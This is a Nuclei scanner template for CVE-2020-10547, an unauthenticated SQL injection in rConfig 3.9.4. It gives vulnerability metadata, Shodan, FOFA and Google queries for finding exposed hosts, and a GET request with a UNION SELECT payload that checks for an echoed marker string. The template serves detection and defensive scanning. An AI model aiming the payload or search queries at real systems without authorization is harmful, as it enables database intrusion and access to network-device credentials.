id: CVE-2020-10547

info:
  name: rConfig 3.9.4 - SQL Injection
  author: madrobot
  severity: critical
  description: rConfig 3.9.4 and previous versions has unauthenticated compliancepolicyelements.inc.php SQL injection. Because nodes' passwords are stored by default in cleartext, this vulnerability leads to lateral movement, granting an attacker access to monitored network devices.
  impact: |
    Successful exploitation of this vulnerability allows an attacker to execute arbitrary SQL queries, potentially leading to unauthorized access, data manipulation.
  remediation: |
    Upgrade to the latest version of rConfig or apply the provided patch to fix the SQL Injection vulnerability.
  reference:
    - https://github.com/theguly/exploits/blob/master/CVE-2020-10547.py https://theguly.github.io/2020/09/rconfig-3.9.4-multiple-vulnerabilities/
    - https://github.com/theguly/exploits/blob/master/CVE-2020-10547.py
    - https://theguly.github.io/2020/09/rconfig-3.9.4-multiple-vulnerabilities/
    - https://github.com/theguly/exploits
    - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-10547
    cwe-id: CWE-89
    epss-score: 0.90705
    epss-percentile: 0.9959
    cpe: cpe:2.3:a:rconfig:rconfig:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: rconfig
    product: rconfig
    shodan-query: http.title:"rconfig"
    fofa-query: title="rconfig"
    google-query: intitle:"rconfig"
  tags: cve,cve2020,rconfig,sqli,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/compliancepolicyelements.inc.php?search=True&searchField=antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL,NULL+--+&searchColumn=elementName&searchOption=contains"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "[project-discovery]"

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100fa6e5feba65ea7bcccec5d4f8dedff9d8099bbcbdeacfc0f873a2270bce4b82e022100964a18e7b580bd64a432380e93a08410ceef05dcdc94a9360734d56207dbcf5d:922c64590222798bb761d5b6d8e72950